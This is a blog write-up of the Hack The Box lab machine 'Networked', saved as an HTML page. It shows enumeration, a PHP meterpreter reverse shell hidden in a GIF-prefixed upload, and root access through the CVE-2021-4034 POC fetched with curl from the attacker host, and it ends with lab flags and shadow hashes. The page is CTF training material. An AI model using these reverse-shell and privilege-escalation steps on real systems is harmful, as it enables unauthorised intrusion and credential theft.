@@ -1,0 +1,769 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Networked Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Networked Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-networked/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-17T23:36:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-networked/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">Alex Loney</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Networked Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-17T23:36:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="/blog/writeup/htb/htb-networked/" class="u-url" itemprop="url">HTB: Networked Writeup
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>This began with an nmap scan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.146
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-30 14:50 EDT
+Nmap scan report <span class="k">for </span>10.10.10.146
+Host is up <span class="o">(</span>0.69s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 806 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 191 filtered tcp ports <span class="o">(</span>host-unreach<span class="o">)</span>
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open   http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+443/tcp closed https
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.17 seconds
+</span></code></pre></div></div>
+
+<p>From these ports, the only really interesting one is 80. We also have a bit of info, the machine is running CentOS and PHP 5.4.16.</p>
+
+<h2 id="port-80">Port 80</h2>
+<p>Beginning with a gobuster scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://10.10.10.146 <span class="nt">-x</span> php
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.146
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/06/30 14:59:20 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 229]
+/lib.php              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]  
+/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.146/uploads/]
+/backup               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.146/backup/] 
+/upload.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 169]                                   
+/photos.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5980]                                  
+/.                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 229]
+</code></pre></div></div>
+
+<p>The scan lists a few interesting files, it looks like there’s an <code class="language-plaintext highlighter-rouge">upload.php</code> that may be of interest to us. Additionally, there’s a <code class="language-plaintext highlighter-rouge">backup</code> directory. Taking a look at the backup directory, I can see <code class="language-plaintext highlighter-rouge">backup.tar</code> listed there, which is the source code of the PHP files!</p>
+
+<p>Looking through the PHP files, it looks like <code class="language-plaintext highlighter-rouge">upload.php</code> will receive input from the user as an uploaded file then validate that it’s a valid file with <code class="language-plaintext highlighter-rouge">check_file_type</code></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
+  <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
+  <span class="nf">displayform</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">check_file_type</code> function will obtain the MIME of the file and check if it contains <code class="language-plaintext highlighter-rouge">image/</code>.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>  
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Next, once the file validates the MIME type, it next checks the file extension:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
+<span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
+<span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So the uploaded file must have one of the image extensions and a valid MIME type.</p>
+
+<p>From here, I spent a lot of time trying to bypass the file extension check to upload an image with a <code class="language-plaintext highlighter-rouge">.php</code> extension. I tried many things such as using <code class="language-plaintext highlighter-rouge">jhead</code> to modify a JPG file and inserting a NULL byte into the uploaded filename (e.g. <code class="language-plaintext highlighter-rouge">shell.php\x00.jpg</code>). But I was unable to bypass this file extension filter. After a while of trying on this “easy” box, I finally gave up and look at the ippsec video where he went over the box and he simply uploaded it WITH the image extension, and the webserver still executed it as PHP code. Why didn’t I think of trying to see if the image executed as PHP??</p>
+
+<p>Next, crafting the payload PHP script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"GIF8;"</span> <span class="o">&gt;</span> payload.php.gif
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="o">&gt;&gt;</span> payload.php.gif
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1111 bytes
+</code></pre></div></div>
+
+<p>The above creates a file with the GIF magic number (<code class="language-plaintext highlighter-rouge">GIF8;</code>), and appends a PHP payload on to the image with a reverse meterpreter payload.</p>
+
+<p>Next, we must set up a listener to catch the callback when we receive it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span> <span class="nt">-x</span> <span class="s2">"use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 10.10.14.5; set lport 8080; run"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+payload <span class="o">=&gt;</span> php/meterpreter/reverse_tcp
+lhost <span class="o">=&gt;</span> 10.10.14.5
+lport <span class="o">=&gt;</span> 8080
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:8080 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39927 bytes<span class="o">)</span> to 10.10.10.146
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.5:8080 -&gt; 10.10.10.146:36816<span class="o">)</span> at 2022-06-30 14:26:53 <span class="nt">-0400</span>
+</code></pre></div></div>
+
+<p>Finally, uploading the <code class="language-plaintext highlighter-rouge">payload.php.gif</code> and then accessing it via the web browser was able to callback to our listener and give us an interactive shell.</p>
+
+<h1 id="privesc---user">Privesc - User</h1>
+<p>TBD</p>
+
+<h1 id="privesc---root">Privesc - Root</h1>
+<p>I’m not certain if this is the intended way to obtain root, but when I ran linpeas, it reported that this machine is vulnerable to CVE-2021-4034. That exploit has a <a href="https://github.com/arthepsy/CVE-2021-4034">POC posted on github</a>, however that POC requires compiling with gcc and we do not have gcc on the target machine. That did not pose a problem though, on my local machine I downloaded the POC and compiled it, it does internally use GCC again, so I compiled two versions of it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+<span class="nv">$ </span>gcc cve-2021-4034-poc.c <span class="nt">-o</span> cve-2021-4034-poc
+<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s:execve:// execve:g'</span> cve-2021-4034-poc.c
+<span class="nv">$ </span>gcc cve-2021-4034-poc.c <span class="nt">-o</span> cve-2021-4034-poc-setup
+<span class="nv">$ </span>./cve-2021-4034-poc-setup
+<span class="nv">$ </span><span class="nb">tar </span>cf - pwnkit | <span class="nb">gzip</span> <span class="nt">-9</span> <span class="o">&gt;</span> pwnkit.tgz
+<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Now, back in our shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> shell
+<span class="nb">cd</span> /tmp
+curl 10.10.14.5/pwnkit.tgz <span class="nt">-O</span> pwnkit.tgz
+<span class="nb">tar </span>xf pwnkit.tgz
+curl 10.10.14.5/cve-2021-4034-poc <span class="nt">-O</span> cve-2021-4034-poc
+<span class="nb">chmod</span> +x cve-<span class="k">*</span>
+./cve-2021-4034-poc
+<span class="nb">whoami
+</span>root
+<span class="nb">cat</span> /home/g<span class="k">*</span>/user.txt
+526cfc2305f17faaacecf212c57d71c5
+<span class="nb">cat</span> /root/root.txt
+0a8ecda83f1d81251099e8ac3d0dcb82
+<span class="nb">cat</span> /etc/shadow
+root:<span class="nv">$6$wRmoL66y$Lz9oA82o1iDwKwJjhUwuGhuOakrYdclnbsJ</span>/K9OQF40hMNk0UDoxtTqQ1UnC8SzLyZ8sujxQjhT/gvmkOfoJZ1:18079:0:99999:7:::
+guly:<span class="nv">$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui</span>/1rydhlIih/PEqDI8ZsrHUsET1y93GtydanJBwl82eGO8Iw0JJM90:18079:0:99999:7:::
+</code></pre></div></div>
+
+<p>And that’s it, we’re now root.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item p-category" rel="tag">htb easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item p-category" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item p-category" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-06-17T23:36:00-07:00">June 17, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Networked+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-networked%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-networked%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-networked%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/writeup/htb/htb-dynstr/" class="pagination--pager" title="HTB: Dynstr Writeup
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You May Also Enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-dynstr/" rel="permalink">HTB: Dynstr Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-knife/" rel="permalink">HTB: Knife Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-love/" rel="permalink">HTB: Love Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
